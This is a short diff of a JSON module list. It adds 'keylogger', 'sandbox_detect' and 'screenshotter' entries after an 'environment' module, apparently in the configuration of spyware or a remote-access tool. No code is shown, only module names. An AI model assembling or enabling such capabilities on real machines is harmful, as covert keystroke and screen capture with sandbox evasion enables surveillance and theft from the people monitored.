@@ -4,5 +4,14 @@
 },
 {
 "module" : "environment"
+},
+{
+"module" : "keylogger"
+},
+{
+"module" : "sandbox_detect"
+},
+{
+"module" : "screenshotter"
 }
 ]
